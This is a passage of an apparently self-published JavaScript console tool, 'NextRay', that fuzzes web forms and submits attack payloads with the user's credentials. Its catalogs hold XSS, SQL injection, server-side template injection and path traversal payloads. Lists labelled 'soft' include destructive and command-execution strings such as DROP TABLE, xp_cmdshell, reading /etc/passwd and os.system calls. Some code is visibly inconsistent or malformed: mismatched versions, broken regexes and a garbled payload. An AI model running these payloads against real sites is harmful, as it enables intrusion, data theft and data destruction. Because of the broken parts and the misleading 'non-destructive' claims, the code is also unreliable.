/*
 NextRay – Console Validation & Exploit Helper (All‑in‑One Snippet)
 Version: 1.0.0 (2025‑08‑19)
 Author: ArkhAngelLifeJiggy

 ⚠️ LEGAL/ETHICAL USE
 Use ONLY on apps you own or have explicit permission to test (e.g., bug bounty scope). 
 This tool can generate and send requests. You are responsible for how you use it.

 PURPOSE
 A single drop‑in, console‑runnable toolkit that:
 1) Discovers forms, inputs, buttons (visible + hidden + contenteditable)
 2) Profiles client‑side validation & basic sanitization behavior
 3) Fuzzes characters and encodings to find what’s accepted/blocked
 4) Runs context‑aware reflection checks (HTML/Attr/JS/JSON) on responses
 5) Observes errors/status codes for exploit leads
 6) Suggests bypass walk‑throughs
 7) Generates a compact report with prioritized findings

 MODES
 - passive: no network submission; analyzes DOM/validation only
 - active: submits safe test payloads via fetch (non‑destructive best effort)
 - heavy: like active, adds extra encodings and deeper reflection checks

 USAGE
   // Paste into DevTools Console, then:
   NextRay.run({ mode: 'passive' })
   NextRay.run({ mode: 'active', scope: 'document' })
   NextRay.exportJSON()   // Download JSON report
   NextRay.report()       // Pretty console summary

*/
(function () {
  if (window.NextRay && window.NextRay.__version) {
    console.warn("[NextRay] Already loaded v" + window.NextRay.__version);
    return;
  }

  const __version = "5.0.0";
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const nowISO = () => new Date().toISOString();

  // ---------------------------
  // Config & Payload Catalogs
  // ---------------------------
  const DEFAULTS = {
    mode: "passive", // 'passive' | 'active' | 'heavy'
    scope: "document", // 'document' | CSS selector root
    maxPerInput: 20, // max payload attempts per input per phase
    submitTimeoutMs: 8000,
    respectCSP: true,
    includeContentEditable: true,
    includeHidden: true,
    includeInteractives: true,
    interactiveLimit: 100,
    domScan: true, // scan current DOM for marker reflections
    testSpecialChars: true, // run per-character acceptance tests
    network: {
      submitGETWhenPossible: true,
      submitPOSTForForms: true,
      respectMethod: true,
    },
  };

  // Core atom tests (expanded for broader coverage)
  const BASE_CHARS = [
    // ASCII specials
    "<",
    ">",
    '"',
    "'",
    "`",
    "=",
    "/",
    "\\",
    "(",
    ")",
    "{",
    "}",
    "[",
    "]",
    ";",
    "&",
    "|",
    "%",
    "+",
    ":",
    "~",
    "*",
    "$",
    ",",
    ".",
    // Whitespace + controls
    " ",
    "\t",
    "\n",
    "\r",
    "\f",
    "\u00a0", // nbsp
    "\u2000",
    "\u2003",
    "\u2009", // spaces
    "\u200b", // zero-width space
    "\u200d", // zwj
    "\ufeff", // bom
    "\u2028",
    "\u2029", // line/para sep
    "\u202e", // RLO
    // Fullwidth confusables
    "＂",
    "／",
    "＜",
    "＞",
    "＝",
    "（",
    "）",
    "；",
    "＆",
    "｜",
    "％",
    "＋",
    "＇",
    "＄",
    "，",
    "。",
  ];

  const BASE_PAYLOADS = {
    generic: [
      "NxR", // harmless marker
      '"NxR"',
      "'NxR'",
      "`NxR`",
      "<NxR>",
      "><NxR>",
      "NxR()",
      "NxR--",
      "NxR#",
      "NxR/*",
      "*/NxR",
      "NxR;",
      ";NxR",
      "NxR\r\n",
      "\r\nNxR",
      "NxR\t",
      "\tNxR",
      "NxR%00",
      "%00NxR",
      "NxR%0a",
      "NxR%0d",
      "NxR%20",
      "NxR+",
      "+NxR",
      "NxR.",
      ".NxR",
      "NxR,",
      ",NxR",
      "NxR|",
      "|NxR",
      "NxR&",
    ],
    xss_soft: [
      "<x NxR>y",
      '" onmouseover=alert(1) x="',
      "' onfocus=alert(1) x='",
      'NxR">',
      'NxR">',
      "<img src=x onerror=alert(1) NxR>",
      "<script>alert(1)</script><!--NxR-->",
      "javascript:alert(1)<!--NxR-->",
      "<svg onload=alert(1)><!--NxR-->",
      "onload=alert(1) NxR",
      "onerror=alert(1) NxR",
      "<iframe src=javascript:alert(1) NxR>",
      "<body onload=alert(1) NxR>",
      "<input onfocus=alert(1) NxR autofocus>",
      "<textarea onfocus=alert(1) NxR autofocus>",
      "<select onfocus=alert(1) NxR autofocus>",
      "<keygen onfocus=alert(1) NxR autofocus>",
      "<video><source onerror=alert(1) NxR>",
      "<audio><source onerror=alert(1) NxR>",
      "<img src=1 onerror=alert(1) NxR>",
      "<div onmouseover=alert(1) NxR>test</div>",
      "<a href=javascript:alert(1) NxR>click</a>",
      "<form action=javascript:alert(1) NxR><input type=submit></form>",
      "<button onclick=alert(1) NxR>click</button>",
      "<marquee onstart=alert(1) NxR></marquee>",
      "<blink onfocus=alert(1) NxR>test</blink>",
      "<embed src=javascript:alert(1) NxR>",
      "<object data=javascript:alert(1) NxR></object>",
      "<applet code=javascript:alert(1) NxR></applet>",
      "<isindex action=javascript:alert(1) NxR>",
    ],
    sqli_soft: [
      "' OR '1'='1",
      '" OR "1"="1',
      "') OR ('1'='1",
      "'; DROP TABLE users; --",
      "'; SELECT * FROM users; --",
      "'; UNION SELECT 1,2,3; --",
      "'; EXEC xp_cmdshell('dir'); --",
      "'; CALL system('ls'); --",
      "' OR 1=1--",
      "' OR 'x'='x",
      "' OR 1=1#",
      "' OR '1'='1'/*",
      "' OR '1'='1'*/",
      "'; WAITFOR DELAY '00:00:05'--",
      "'; SLEEP(5)--",
      "'; BENCHMARK(1000000,MD5(1))--",
      "'; AND 1=1--",
      "'; AND 1=2--",
      "'; OR 1=1--",
      "'; OR 1=2--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
      "' AND (SELECT COUNT(*) FROM mysql.user)>0--",
      "' AND LENGTH(database())>0--",
      "' AND SUBSTRING(version(),1,1)='5'--",
      "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>65--",
      "'; DECLARE @x VARCHAR(8000);SET @x=0xx);--",
      "'; CREATE TABLE cmd_exec(cmd_output TEXT); INSERT INTO cmd_exec EXEC xp_cmdshell 'dir'; SELECT * FROM cmd_exec;--",
      "'; SELECT LOAD_FILE('/etc/passwd');--",
      "'; SELECT pg_sleep(5);--",
      "'; SELECT SLEEP(5);--",
    ],
    ssti_soft: [
      "{{7*7}}",
      "${7*7}",
      "<%= 7*7 %>",
      "#{7*7}",
      "${{7*7}}",
      "@(7*7)",
      "#{new java.lang.String(new byte[]{99,111,109,112,105,108,101})}",
      "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
      "${T(java.lang.Runtime).getRuntime().exec('ls')}",
      "#{T(java.lang.Runtime).getRuntime().exec('ls')}",
      "${request.__class__.__mro__[-1].__subclasses__()[121()._module.__builtins__['__import__']('os').system('ls')}",
      "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('ls') }",
      "${pageContext}",
      "${applicationScope}",
      "${sessionScope}",
      "${requestScope}",
      "${param}",
      "${paramValues}",
      "${header}",
      "${headerValues}",
      "${cookie}",
      "${initParam}",
      "${pageContext.session.id}",
      "${pageContext.servletContext.serverInfo}",
      "${pageContext.request.remoteAddr}",
      "${pageContext.request.method}",
      "${pageContext.request.queryString}",
      "${pageContext.request.requestURL}",
      "${pageContext.request.contextPath}",
      "${pageContext.request.servletPath}",
    ],
    path_soft: [
      "../",
      "../../",
      "..\\",
      "%2e%2e%2f",
      "..%2f",
      "..%5c",
      "..%252e%252f",
      "%2e%2e%5c",
      "..%c0%af",
      "..%c1%9c",
      "%c0%ae%c0%ae%c0%af",
      "%c0%ae%c0%ae%c1%9c",
      "..%25c0%25ae%25c0%25ae%25c0%25af",
      "..%u2215",
      "..%u2216",
      "..%uEFC8",
      "..%uF025",
      "..%u002f",
      "..%u005c",
      ".../...//",
      "...\\...\\\\",
      "....//",
      "....\\\\",
      "./../",
      ".\\..\\",
      "././",
      ".\\.\\",
      "%252e%252e%252f",
      "%252e%252e%255c",
      "%252e%252e/",
    ],
  };

  const HEAVY_EXTRA_ENCODINGS = [
    "url",
    "url2",
    "html",
    "html_hex",
    "base64",
    "js_unicode",
    "unicode_nfkd",
    "unicode_confusables",
    // Additional encodings
    "css_escape",
    "json_escape",
    "xml_escape",
    "sql_escape",
    "ldap_escape",
    "shell_escape",
    "percent_encoding",
    "double_encoding",
    "utf7_encoding",
    "utf8_overlong",
    "utf16_surrogate",
    "ucs2_encoding",
    "iso8859_encoding",
    "windows1252_encoding",
    "ebcdic_encoding",
    "base32_encoding",
    "base85_encoding",
    "uu_encoding",
    "quoted_printable",
    "mime_encoding",
    "punycode_encoding",
    "idna_encoding",
    "ascii85_encoding",
    "yenc_encoding",
    "binhex_encoding",
    "uuencode_encoding",
    "xxencode_encoding",
    "radix64_encoding",
    "crypt_encoding",
    "rot13_encoding",
    "caesar_cipher",
    "atbash_cipher",
    "vigenere_cipher",
    "xor_encoding",
    "hex_encoding",
    "octal_encoding",
    "binary_encoding",
    "morse_code",
    "braille_encoding",
    "barcode_encoding",
    "qrcode_encoding",
    "data_uri_encoding",
    "jwt_encoding",
    "protobuf_encoding",
    "msgpack_encoding",
    "bson_encoding",
    "cbor_encoding",
    "ubjson_encoding",
    "bjdata_encoding",
    "ion_encoding",
    "thrift_encoding",
    "avro_encoding",
    "parquet_encoding",
    "orc_encoding",
  ];

  // ---------------------------
  // Helpers: DOM + Net + Encoding
  // ---------------------------
  const $$ = (root, sel) =>
    Array.from((root || document).querySelectorAll(sel));

  function isSubmittable(el) {
    const tag = (el.tagName || "").toLowerCase();
    if (tag === "input") {
      const t = (el.type || "").toLowerCase();
      // Avoid dangerous input types
      if (
        [
          "button",
          "submit",
          "text",
          "search",
          "email",
          "url",
          "number",
          "password",
          "tel",
          "hidden",
          "date",
          "datetime",
          "datetime-local",
          "month",
          "time",
          "week",
          "color",
          "range",
          "file",
          "image",
          "checkbox",
          "radio",
          "reset",
        ].includes(t)
      )
        return true;
      if (t === "") return true; // default text
      return false;
    }
    if (tag === "textarea" || tag === "select") return true;
    if (tag === "button" && (el.type || "").toLowerCase() === "submit")
      return true;
    if (tag === "button" && !el.type) return true; // default submit
    if (el.contentEditable === "true") return true;
    if (el.isContentEditable) return true;
    return false;
  }

  function getAllTargets(opts) {
    const root =
      opts.scopeRoot ||
      (opts.scope && opts.scope !== "document"
        ? document.querySelector(opts.scope)
        : document);
    const forms = $$(root, "form");
    const inputs = $$(root, "input, textarea, select").filter(isSubmittable);
    const buttons = $$(root, "button, input[type=submit], input[type=button]");
    // Additional parameters and targets
    const links = $$(root, "a[href]");
    const media = $$(root, "audio, video, img, source, track");
    const embeds = $$(root, "iframe, embed, object, applet");
    const frames = $$(root, "frame, frameset");
    const plugins = $$(root, "param, applet, object");
    const meta = $$(root, "meta[http-equiv], meta[name]");
    const scripts = $$(root, "script[src], script[type]");
    const styles = $$(root, "link[rel=stylesheet], style");
    const canvases = $$(root, "canvas");
    const svgs = $$(root, "svg, image, use, symbol");
    const maps = $$(root, "map, area");
    const tables = $$(root, "table, td, th, tr, tbody, thead, tfoot");
    const lists = $$(root, "ul, ol, li, dl, dt, dd");
    const navigation = $$(root, "nav, menu, menuitem");
    const details = $$(root, "details, summary");
    const dialogs = $$(root, "dialog, [role=dialog]");
    const modals = $$(root, "[data-modal], [aria-modal=true]");
    const tooltips = $$(root, "[title], [data-tooltip], [aria-label]");
    const labels = $$(root, "label, legend");
    const fieldsets = $$(root, "fieldset, optgroup");
    const options = $$(root, "option, optgroup");
    const progress = $$(root, "progress, meter");
    const ranges = $$(root, "input[type=range]");
    const colors = $$(root, "input[type=color]");
    const dates = $$(
      root,
      "input[type=date], input[type=datetime], input[type=datetime-local], input[type=month], input[type=time], input[type=week]"
    );
    const numbers = $$(root, "input[type=number]");
    const files = $$(root, "input[type=file]");
    const emails = $$(root, "input[type=email]");
    const urls = $$(root, "input[type=url]");
    const searches = $$(root, "input[type=search]");
    const telephones = $$(root, "input[type=tel]");
    const passwords = $$(root, "input[type=password]");
    const textareas = $$(root, "textarea");
    const selects = $$(root, "select");
    const checkboxes = $$(root, "input[type=checkbox]");
    const radios = $$(root, "input[type=radio]");
    const submitButtons = $$(root, "input[type=submit], button[type=submit]");
    const resetButtons = $$(root, "input[type=reset], button[type=reset]");
    const customElements = $$(root, "[is], [data-component], [data-widget]");
    const dataAttributes = (function findElementsWithDataAttributes(root) {
      const allElements = Array.from(root.querySelectorAll("*"));
      return allElements.filter((el) =>
        Array.from(el.attributes).some((attr) => attr.name.startsWith("data-"))
      );
    })(root);
    const ariaAttributes = (function findElementsWithAriaAttributes(root) {
      const allElements = Array.from(root.querySelectorAll("*"));
      return allElements.filter((el) =>
        Array.from(el.attributes).some((attr) => attr.name.startsWith("aria-"))
      );
    })(root);
    const eventHandlers = $$(
      root,
      "[onclick], [onchange], [onsubmit], [oninput], [onfocus], [onblur], [onkeydown], [onkeyup], [onkeypress]"
    );
    const draggables = $$(root, "[draggable=true]");
    const dropzones = $$(root, "[dropzone]");
    const spellcheck = $$(root, "[spellcheck]");
    const translate = $$(root, "[translate]");
    const contextmenu = $$(root, "[contextmenu]");
    const tabindex = $$(root, "[tabindex]");
    const accesskey = $$(root, "[accesskey]");
    const contentEditable = $$(root, "[contenteditable]");
    const designMode = $$(root, "[designMode]");

    const editables = opts.includeContentEditable
      ? $$(root, '[contenteditable="true"').filter((el) => el.isContentEditable)
      : [];
    const hidden = opts.includeHidden
      ? inputs.filter((el) => el.type === "hidden")
      : [];

    // Interactive inventory: anchors, role=button, tabindex, inline handlers, etc.
    const interactives = opts.includeInteractives
      ? Array.from(
          new Set([
            ...$$(root, "a[href]"),
            ...$$(
              root,
              "[role=button], [role=link], [role=tab], [role=menuitem]"
            ),
            ...$$(root, "[tabindex]"),
            ...$$(root, "*[onclick], *[onchange], *[onsubmit], *[oninput]"),
            // Additional selectors for more interactive elements
            ...$$(root, "button"),
            ...$$(
              root,
              "input[type=submit], input[type=button], input[type=checkbox], input[type=radio]"
            ),
            ...$$(root, "select, textarea"),
            ...$$(root, "[contenteditable=true]"),
            ...$$(root, "[draggable=true]"),
            // New interactive elements
            ...$$(root, "details > summary"),
            ...$$(root, "[aria-expanded]"),
            ...$$(root, "[aria-haspopup]"),
            ...$$(root, "[aria-controls]"),
            ...$$(root, "[data-toggle]"),
            ...$$(root, "[data-dismiss]"),
            ...$$(root, "[data-target]"),
            ...$$(root, "label[for]"),
            ...$$(root, "iframe"),
            ...$$(root, "embed"),
            ...$$(root, "object"),
            ...$$(root, "[role=combobox]"),
            ...$$(root, "[role=listbox]"),
            ...$$(root, "[role=option]"),
            ...$$(root, "[role=treeitem]"),
            ...$$(root, "[role=slider]"),
            ...$$(root, "[role=spinbutton]"),
            ...$$(root, "meter"),
            ...$$(root, "progress"),
            ...$$(root, "fieldset"),
            ...$$(root, "form"),
            ...$$(root, "[role=form]"),
            ...$$(root, "[role=search]"),
            ...$$(root, "dialog, [role=dialog]"),
            ...$$(root, "[role=alertdialog]"),
            ...$$(root, "[role=tooltip"),
            ...$$(root, "[data-tooltip"),
            // Additional Client Side
            ...$$(root, "audio[controls]"),
            ...$$(root, "video[controls]"),
            ...$$(root, "[role=tabpanel]"),
            ...$$(root, "[role=menu]"),
            ...$$(root, "[role=menubar]"),
            ...$$(root, "[role=navigation]"),
            ...$$(root, "nav"),
            ...$$(root, "[data-action]"),
            ...$$(root, "[data-click]"),
            ...$$(root, "canvas"),
            ...$$(root, "[role=application]"),
            // Server Side elements that can be interactive
            ...$$(root, "[data-remote=true]"),
            ...$$(root, "[data-method]"),
            ...$$(root, "[data-confirm]"),
            ...$$(root, "[data-ajax=true]"),
            ...$$(root, "[data-behavior]"),
            ...$$(root, "[data-submit]"),
            ...$$(root, "[hx-get], [hx-post], [hx-put], [hx-delete]"), // HTMX
            ...$$(root, "[data-component]"),
            ...$$(root, "[data-widget]"),
            ...$$(root, "[data-modal]"),
            ...$$(root, "[data-popup]"),
            ...$$(root, "[data-dropdown]"),
            ...$$(root, "[data-autocomplete]"),
            ...$$(root, "[data-suggest]"),
            ...$$(root, "[data-live-search]"),
            ...$$(root, "[data-pjax]"),
            ...$$(root, "[data-turbo=true]"),
            ...$$(root, "[data-ujs=true]"),
            ...$$(root, "[data-behavior~=autosave]"),
            ...$$(root, "[data-behavior~=autovalidate]"),
          ])
        ).slice(0, opts.interactiveLimit)
      : [];

    return { forms, inputs, buttons, editables, hidden, interactives };
  }

  function attrSummary(el) {
    const a = {};
    for (const { name, value } of Array.from(el.attributes || [])) {
      if (["value"].includes(name)) continue;
      a[name] = value;
    }
    return a;
  }

  function elementPath(el) {
    const parts = [];
    while (el && el.nodeType === 1 && parts.length < 8) {
      let p = el.tagName.toLowerCase();
      if (el.id) p += "#" + el.id;
      if (el.classList && el.classList.length)
        p += "." + Array.from(el.classList).slice(0, 3).join(".");
      parts.unshift(p);
      el = el.parentElement;
    }
    return parts.join(" > ");
  }

  // Helper to make control characters visible for reporting
  function escapeControl(s) {
    return (s || "").replace(/[\x00-\x1F\x7F-\x9F\\]/g, (c) => {
      switch (c) {
        case "\n":
          return "\\n";
        case "\r":
          return "\\r";
        case "\t":
          return "\\t";
        case "\f":
          return "\\f";
        case "\b":
          return "\\b";
        case "\\":
          return "\\\\";
        default:
          return "\\x" + c.codePointAt(0).toString(16).padStart(2, "0");
      }
    });
  }

  // ---- Page & Element State Extraction ----
  function ariaAndDataAttrs(el) {
    const out = {};
    for (const { name, value } of Array.from(el.attributes || [])) {
      if (name.startsWith("aria-") || name.startsWith("data-"))
        out[name] = value;
    }
    return out;
  }
  function hasInlineHandlers(el) {
    const attrs = Array.from(el.attributes || []).map((a) => a.name);
    return attrs.filter((n) => /^on[a-z]+$/i.test(n));
  }
  function visibleInfo(el) {
    const cs = window.getComputedStyle ? getComputedStyle(el) : null;
    const rect = el.getBoundingClientRect
      ? el.getBoundingClientRect()
      : { width: 0, height: 0 };
    const visible =
      !!(el.offsetParent || (cs && cs.position === "fixed")) &&
      (!cs || (cs.visibility !== "hidden" && cs.display !== "none"));
    return {
      visible,
      width: Math.round(rect.width),
      height: Math.round(rect.height),
    };
  }
  function textSnippet(el, max = 80) {
    const t = (el.innerText || el.textContent || "")
      .trim()
      .replace(/\s+/g, " ");
    return t.length > max ? t.slice(0, max - 1) + "…" : t;
  }
  function interactiveSummary(el) {
    const href = el.getAttribute && (el.getAttribute("href") || null);
    let hrefParams = [];
    try {
      if (href) {
        const u = new URL(href, location.href);
        hrefParams = Array.from(u.searchParams.keys());
      }
    } catch (_) {}
    const closestForm = el.form || (el.closest && el.closest("form")) || null;
    return {
      target: elementPath(el),
      tag: (el.tagName || "").toLowerCase(),
      id: el.id || null,
      name: el.getAttribute && (el.getAttribute("name") || null),
      role: el.getAttribute && (el.getAttribute("role") || null),
      href,
      type: el.getAttribute && (el.getAttribute("type") || null),
      targetAttr: el.getAttribute && (el.getAttribute("target") || null),
      rel: el.getAttribute && (el.getAttribute("rel") || null),
      tabindex: el.getAttribute && (el.getAttribute("tabindex") || null),
      inlineHandlers: hasInlineHandlers(el),
      ariaData: ariaAndDataAttrs(el),
      dataset: Object.assign({}, el.dataset || {}),
      params: {
        hrefParams,
        datasetKeys: Object.keys(el.dataset || {}),
        nameAttr: el.getAttribute && (el.getAttribute("name") || null),
        valueAttr: el.getAttribute && (el.getAttribute("value") || null),
        formRef: closestForm
          ? closestForm.getAttribute("name") || closestForm.id || "form"
          : null,
        formMethod: closestForm
          ? closestForm.getAttribute("method") || "GET"
          : null,
        formAction: closestForm
          ? closestForm.getAttribute("action") || location.href
          : null,
      },
      disabled: !!el.disabled,
      text: textSnippet(el),
      box: visibleInfo(el),
    };
  }
  function collectPageState() {
    const cookies = (document.cookie || "")
      .split(";")
      .map((s) => s.trim())
      .filter(Boolean)
      .map((p) => p.split("=")[0]);
    const metaCSP = Array.from(
      document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]')
    ).map((m) => m.getAttribute("content") || "");
    const scripts = Array.from(document.scripts || []);
    const links = Array.from(
      document.querySelectorAll(
        'link[rel="preconnect"], link[rel="dns-prefetch"], link[rel="preload"]'
      )
    );
    return {
      referrer: document.referrer || "",
      origin: location.origin,
      domain: document.domain,
      historyLength: (history && history.length) || 0,
      crossOriginIsolated:
        typeof crossOriginIsolated !== "undefined" ? crossOriginIsolated : null,
      cookies: { count: cookies.length, namesSample: cookies.slice(0, 20) },
      localStorageKeys: Object.keys(localStorage || {}).slice(0, 50),
      sessionStorageKeys: Object.keys(sessionStorage || {}).slice(0, 50),
      csp: metaCSP,
      scripts: {
        total: scripts.length,
        withNonce: scripts.filter((s) => s.getAttribute("nonce")).length,
        inline: scripts.filter((s) => !s.src).length,
      },
      linkHints: links.map((l) => ({ rel: l.rel, href: l.href })),
      serviceWorkerControlled: !!(
        navigator.serviceWorker && navigator.serviceWorker.controller
      ),
    };
  }

  // Encoders
  function encoders() {
    const htmlEntities = (s) =>
      s.replace(
        /[\x00-\x1F\x7F-\x9F<>&"'`=\/\u00A0\u2028\u2029]/g,
        (c) =>
          ({
            "\x00": "&#0;",
            "\x01": "&#1;",
            "\x02": "&#2;",
            "\x03": "&#3;",
            "\x04": "&#4;",
            "\x05": "&#5;",
            "\x06": "&#6;",
            "\x07": "&#7;",
            "\x08": "&#8;",
            "\x09": "&#9;",
            "\x0A": "&#10;",
            "\x0B": "&#11;",
            "\x0C": "&#12;",
            "\x0D": "&#13;",
            "\x0E": "&#14;",
            "\x0F": "&#15;",
            "\x10": "&#16;",
            "\x11": "&#17;",
            "\x12": "&#18;",
            "\x13": "&#19;",
            "\x14": "&#20;",
            "\x15": "&#21;",
            "\x16": "&#22;",
            "\x17": "&#23;",
            "\x18": "&#24;",
            "\x19": "&#25;",
            "\x1A": "&#26;",
            "\x1B": "&#27;",
            "\x1C": "&#28;",
            "\x1D": "&#29;",
            "\x1E": "&#30;",
            "\x1F": "&#31;",
            "\x7F": "&#127;",
            "<": "&lt;",
            ">": "&gt;",
            "&": "&amp;",
            '"': "&quot;",
            "'": "&#39;",
            "/": "&#47;",
            "`": "&#96;",
            "\u00A0": "&nbsp;",
            "\u2028": "&#8232;",
            "\u2029": "&#8233;",
          }[c] || c)
      );
    const htmlHex = (s) =>
      s
        .split("")
        .map((ch) => `&#x${ch.codePointAt(0).toString(16)};`)
        .join("");
    const htmlDec = (s) =>
      s
        .split("")
        .map((ch) => `&#${ch.codePointAt(0)};`)
        .join("");

    const url = (s) => encodeURIComponent(s);
    const url2 = (s) => encodeURI(s);
    const urlLower = (s) =>
      encodeURIComponent(s).replace(/%[0-9A-F]{2}/g, (m) => m.toLowerCase());
    const urlDouble = (s) => encodeURIComponent(encodeURIComponent(s));

    const b64 = (s) => {
      try {
        return btoa(unescape(encodeURIComponent(s)));
      } catch (e) {
        return s;
      }
    };
    const b64url = (s) => {
      const x = b64(s);
      return x.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
    };

    const jsUnicode = (s) =>
      s
        .split("")
        .map((c) => `\\u${c.codePointAt(0).toString(16).padStart(4, "0")}`)
        .join("");
    const jsHex = (s) =>
      s
        .split("")
        .map((c) => {
          const cp = c.codePointAt(0);
          return cp <= 0xff
            ? `\\x${cp.toString(16).padStart(2, "0")}`
            : `\\u${cp.toString(16).padStart(4, "0")}`;
        })
        .join("");
    const cssEscape = (s) =>
      s
        .split("")
        .map((c) => `\\${c.codePointAt(0).toString(16)} `)
        .join("");

    const nfd = (s) => (s.normalize ? s.normalize("NFD") : s);
    const nfc = (s) => (s.normalize ? s.normalize("NFC") : s);
    const nfkd = (s) => (s.normalize ? s.normalize("NFKD") : s);

    // simple homoglyph swap for a few chars (demo grade)
    const confusablesMap = {
      a: "а",
      e: "е",
      o: "о",
      c: "с",
      p: "р",
      x: "х",
      y: "у",
      H: "Н",
      K: "К",
      M: "М",
      T: "Т",
      A: "А",
      B: "В",
      C: "С",
      E: "Е",
      F: "Ｆ",
      G: "Ｇ",
      I: "Ｉ",
      J: "Ｊ",
      O: "Ｏ",
      P: "Ｐ",
      S: "Ｓ",
      X: "Ｘ",
      Y: "Ｙ",
      i: "і",
      j: "ј",
      g: "ɡ",
      l: "ⅼ",
      s: "ѕ",
      u: "ｕ",
      v: "ｖ",
      w: "ｗ",
      z: "ｚ",
      b: "ｂ",
      d: "ｄ",
      q: "ｑ",
      n: "ｎ",
      m: "ｍ",
      r: "ｒ",
      t: "ｔ",
      f: "ｆ",
      h: "ｈ",
      k: "ｋ",
      D: "Ｄ",
      L: "Ｌ",
      N: "Ｎ",
      R: "Ｒ",
      U: "Ｕ",
      V: "Ｖ",
      W: "Ｗ",
      Z: "Ｚ",
      0: "０",
      1: "１",
      2: "２",
      3: "３",
      4: "４",
      5: "５",
      6: "６",
      7: "７",
      8: "８",
      9: "９",
      "/": "∕",
      "\\": "∖",
      ".": "․",
      ":": "∶",
      "-": "﹣",
      "(": "（",
      ")": "）",
      "[": "［",
      "]": "］",
      "{": "｛",
      "}": "｝",
      "<": "﹤",
      ">": "﹥",
      "!": "ǃ",
      "?": "？",
      ";": "；",
      ",": "，",
      "'": "＇",
      '"': "＂",
      "`": "｀",
      "~": "～",
      "@": "＠",
      "#": "＃",
      $: "＄",
      "%": "％",
      "^": "＾",
      "&": "＆",
      "*": "＊",
      "+": "＋",
      "=": "＝",
      "|": "｜",
      _: "＿",
      " ": " ",
      "	": " ",
      "\n": "",
      "\r": "",
      "€": "₠",
      "£": "₤",
      "¥": "yen",
      "¢": "¢",
      "©": "©",
      "®": "®",
      "™": "™",
      "§": "§",
      "¶": "¶",
      "†": "†",
      "‡": "‡",
      "•": "•",
      "‰": "‰",
      "′": "′",
      "″": "″",
      "‴": "‴",
      "‵": "‵",
      "‶": "‶",
      "‷": "‷",
      "‹": "‹",
      "›": "›",
      "«": "«",
      "»": "»",
      "‘": "‘",
      "’": "’",
      "‚": "‚",
      "“": "“",
      "”": "”",
      "„": "„",
      "‟": "‟",
      "′": "′",
      "″": "″",
    };
    const confusables = (s) =>
      s.replace(
        /[a-zA-Z0-9\/\\.\:\-\(\)\[\]\{\}\<\>\!\?\;\,\'\"\`\~\@\#\$\%\^\&\*\+\=\|\_\s\t\n\r€£¥¢©®™§¶†‡•‰′″‴‵‶‷‹›«»‘’‚“”„‟]/g,
        (ch) => confusablesMap[ch] || ch
      );

    const slashEscapes = (s) => s.replace(/["'`\\]/g, "\\$&");

    return {
      htmlEntities,
      htmlHex,
      htmlDec,
      url,
      url2,
      urlLower,
      urlDouble,
      b64,
      b64url,
      jsUnicode,
      jsHex,
      cssEscape,
      nfd,
      nfc,
      nfkd,
      confusables,
      slashEscapes,
    };
  }

  // Build variants for payload fuzzing
  function buildVariants(payload, heavy) {
    const e = encoders();
    const variants = [{ label: "raw", value: payload }];
    if (heavy) {
      // Curated list for 'heavy' to reduce request volume significantly.
      // The HEAVY_EXTRA_ENCODINGS list is currently unused.
      variants.push(
        { label: "url", value: e.url(payload) },
        { label: "html_hex", value: e.htmlHex(payload) },
        { label: "base64", value: e.b64(payload) },
        { label: "js_unicode", value: e.jsUnicode(payload) },
        { label: "unicode_confusables", value: e.confusables(payload) },
        { label: "slashes_escaped", value: e.slashEscapes(payload) }
      );
    }
    return variants;
  }

  // ---------------------------
  // Client Validation/Sanitization Probing
  // ---------------------------
  function probeInput(el, payload) {
    const original = el.value;
    let changed = false,
      modifiedTo = null,
      validity = null;
    try {
      el.focus();
      const beforeLen = el.value.length;
      el.value = payload; // let any input filters run on set
      el.dispatchEvent(new Event("input", { bubbles: true }));
      el.dispatchEvent(new Event("change", { bubbles: true }));
      validity = el.validity ? Object.assign({}, el.validity) : null;
      if (el.value !== payload) {
        changed = true;
        modifiedTo = el.value;
      }
      // restore
      el.value = original;
      el.dispatchEvent(new Event("input", { bubbles: true }));
      el.dispatchEvent(new Event("change", { bubbles: true }));
    } catch (e) {
      // ignore
    }
    return { changed, modifiedTo, validity };
  }

  function allowedCharsMatrix(el) {
    const results = [];
    for (const ch of BASE_CHARS) {
      const r = probeInput(el, "A" + ch + "B");
      const accepted =
        !r.changed && (!r.validity || r.validity.valid !== false);
      results.push({ ch, accepted, modifiedTo: r.modifiedTo });
    }
    return results;
  }

  function makeFormRequest(form, dataObj, method, url) {
    const u = new URL(url, location.href).toString();
    const m = (method || "GET").toUpperCase();
    if (m === "GET") {
      const q = new URL(u);
      for (const [k, v] of Object.entries(dataObj)) q.searchParams.set(k, v);
      return fetch(q.toString(), { credentials: "include" });
    }
    const body = new URLSearchParams();
    for (const [k, v] of Object.entries(dataObj)) body.append(k, v);
    return fetch(u, {
      method: "POST",
      body,
      credentials: "include",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
    });
  }

  function extractFormData(form, override) {
    const fd = new FormData(form);
    const obj = {};
    for (const [k, v] of fd.entries()) obj[k] = String(v);
    if (override) Object.assign(obj, override);
    return obj;
  }

  function classifyContext(snippet) {
    if (/<script[\s\S]*?>[\s\S]*?NxR[\s\S]*?<\/script>/i.test(snippet))
      return "js_block";
    if (/<[^>+?\s[^>*?=[\"'][^\"']*NxR[^\"']*[\"']/i.test(snippet))
      return "html_attr";
    if (/<[^>]*NxR[^>]*>/i.test(snippet)) return "html_tag";
    if (/["'][^"\\]*NxR[^"\\]*["']/.test(snippet)) return "string_literal";
    if (/\{\s*"[^"]*NxR[^"]*"\s*:\s*|:\s*"[^"]*NxR/.test(snippet))
      return "json";
    if (/style\s*=\s*["'][^"']*NxR[^"']*["']/i.test(snippet)) return "css_attr";
    if (/<style[\s\S]*?>[\s\S]*?NxR[\s\S]*?<\/style>/i.test(snippet))
      return "css_block";
    if (/url\([^)]*NxR[^)]*\)/i.test(snippet)) return "css_url";
    if (/on\w+\s*=\s*["'][^"']*NxR[^"']*["']/i.test(snippet))
      return "event_handler";
    if (/javascript:\s*NxR/i.test(snippet)) return "js_uri";
    if (/data:\s*NxR/i.test(snippet)) return "data_uri";
